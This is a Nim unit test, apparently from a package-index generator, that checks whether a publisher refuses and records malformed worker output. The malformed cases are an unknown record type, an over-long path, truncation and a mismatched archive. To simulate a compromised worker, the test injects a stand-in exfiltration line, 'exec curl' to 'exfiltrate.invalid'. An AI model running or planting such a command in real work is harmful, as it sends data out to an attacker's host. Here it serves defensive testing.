## NPC-M10 verification `test_npc_m10_publisher_refuses_malformed_worker_output`
## (threat model G36, FLOW-2).
##
## The worker -> publisher channel is a boundary: the publisher admits a
## fetch edge's output only when it decodes against its kind's closed
## vocabulary and field limits. Three outputs a compromised worker could
## write are handed to the publisher (through the generator's worker-output
## tap, after each wave and before admission):
##
## * `unknowntype`: its `refs` object carries a record of a type the
##   vocabulary does not have;
## * `oversize`: its `source` object names a file whose path is over the
##   path limit;
## * `truncated`: its `source` object is cut short (no final newline);
## * `badarchive`: its `source` object is well formed, and its archive is
##   not the one the object describes.
##
## Each is refused and kept for capture (package, edge, the refused bytes'
## hash, the reason), and no shard holds anything of it: `unknowntype` has
## no record, the over-limit path is in no shard, `oversize` and
## `truncated` have no record, nor has `badarchive`. `wellformed`, whose
## outputs are untouched, is consumed (positive control). The next
## generation takes its source from the host's cache, where admission does
## not re-check an archive; an archive that is not its object's is refused
## there before anything of that generation is published.
##
## Falsifying mutation (recorded in the plan): skipping the publisher's
## schema check lets the unknown-type record in, and fails the test.

import std/[os, strutils, tempfiles, unittest]

import repro_domain_types/nimble_index
import repro_nimble_generator
import repro_nimble_index

import ./generator_fixtures

const Now = 1_790_000_000'u64

proc flipped(a: string): string =
  ## ``a`` with its first byte changed (a member's name in a tar).
  result = a
  result[0] = chr(ord(result[0]) xor 0x01)

proc expectRefusal(cfg: GeneratorConfig): string =
  try:
    discard generate(cfg)
  except GeneratorError as e:
    return e.msg
  "the generation was published"

proc shardTexts(b: BuiltIndex): seq[string] =
  for (id, bytes) in b.objects:
    if id == b.rootId or id == b.root.nameMap.id or id == b.root.events.id:
      continue
    result.add renderShard(decodeShard(bytes))

suite "NPC-M10: the publisher refuses malformed worker output":

  test "unknown type, over-limit field and truncation are refused and captured; a well-formed output is consumed":
    let f = newFixture("m10-worker-output")
    var urls: seq[(string, string)]
    for name in ["unknowntype", "oversize", "truncated", "badarchive",
                 "wellformed"]:
      let path = "nim/" & name & ".git"
      let repo = f.newRepo(path)
      discard repo.commit(@[nimbleFile(name), file("src/" & name & ".nim",
        "discard\n")])
      repo.tag("v1.0.0")
      repo.publish()
      urls.add (name, f.url(path))
    let reg = f.newRepo("nim-lang/packages.git")
    let regCommit = reg.commit(@[packagesJson(urls)])
    reg.publish()
    let work = createTempDir("npc-m10-worker-output-", "")
    var cfg = f.genConfig(parseSourceSet(sourceSetText(
      f.url("nim-lang/packages.git"), regCommit), "s.toml"), Now,
      work / "state", outputDir = work / "index")
    let longPath = "src/" & repeat('x', 8192) & ".nim"
    var tapped: seq[string]
    cfg.workerOutputTap = proc(family: EdgeFamily; subject, outPath: string)
        {.gcsafe.} =
      {.cast(gcsafe).}:
        if family == efRefs and subject == "unknowntype":
          writeFile(outPath, readFile(outPath) &
            "exec curl%20https://exfiltrate.invalid/\n")
          tapped.add subject
        elif family == efSource and subject.startsWith("oversize@"):
          writeFile(outPath, readFile(outPath) & "file " & longPath & "\n")
          tapped.add subject
        elif family == efSource and subject.startsWith("truncated@"):
          let t = readFile(outPath)
          writeFile(outPath, t[0 ..< t.len - 3])
          tapped.add subject
        elif family == efSource and subject.startsWith("badarchive@"):
          # A well-formed object beside an archive that is not its own.
          writeFile(outPath & ".tar", flipped(readFile(outPath & ".tar")))
          tapped.add subject
    let g = generate(cfg)
    check tapped.len == 4

    # Each refused, with what capture needs.
    checkpoint $g.workerRefusals
    check g.workerRefusals.len == 4
    var seen: seq[string]
    for r in g.workerRefusals:
      seen.add r.package
      check r.output.len == 64
      case r.package
      of "unknowntype":
        check r.family == efRefs
        check "unknown refs record" in r.reason
      of "oversize":
        check r.family == efSource
        check "over its limit" in r.reason
      of "truncated":
        check r.family == efSource
        check "ends with a newline" in r.reason
      of "badarchive":
        check r.family == efSource
        check "not the one the object describes" in r.reason
      else:
        check false
    for p in ["unknowntype", "oversize", "truncated", "badarchive"]:
      check p in seen

    # Nothing of them in any shard.
    let texts = shardTexts(g.built)
    check texts.len > 0
    for t in texts:
      check "exfiltrate" notin t
      check repeat('x', 8192) notin t
    if g.built.hasPackage("unknowntype"):
      check g.built.envelopeOf("unknowntype").versions.len == 0
    for p in ["oversize", "truncated", "badarchive"]:
      if g.built.hasPackage(p):
        check g.built.envelopeOf(p).versions.len == 0
    check g.built.observationOf("unknowntype").state != osAnswering

    # Positive control: the untouched package is consumed.
    check g.built.hasPackage("wellformed")
    let e = g.built.envelopeOf("wellformed")
    check e.versions.len == 1
    check e.versions[0].version.tag == "v1.0.0"

    # The next generation on this host takes `wellformed`'s source from the
    # cache, and its object is not re-admitted against its archive. The
    # archive on disk is not the object's (as when a worker wrote both and
    # the cache kept them): it is refused when it would be published, and
    # nothing of that generation is written. (A mirror of its own, which
    # holds no honest copy that would refuse the altered one.)
    var again = f.genConfig(parseSourceSet(sourceSetText(
      f.url("nim-lang/packages.git"), regCommit,
      mirror = work / "fresh-mirror"), "s.toml"), Now,
      work / "state", outputDir = work / "index-again")
    var cachedFlips = 0
    again.workerOutputTap = proc(family: EdgeFamily; subject, outPath: string)
        {.gcsafe.} =
      {.cast(gcsafe).}:
        if family == efSource and subject.startsWith("wellformed@"):
          writeFile(outPath & ".tar", flipped(readFile(outPath & ".tar")))
          inc cachedFlips
    let err = expectRefusal(again)
    checkpoint err
    check cachedFlips == 1
    check "is not the one its object describes" in err
    check not fileExists(work / "index-again" / IndexRootFile)
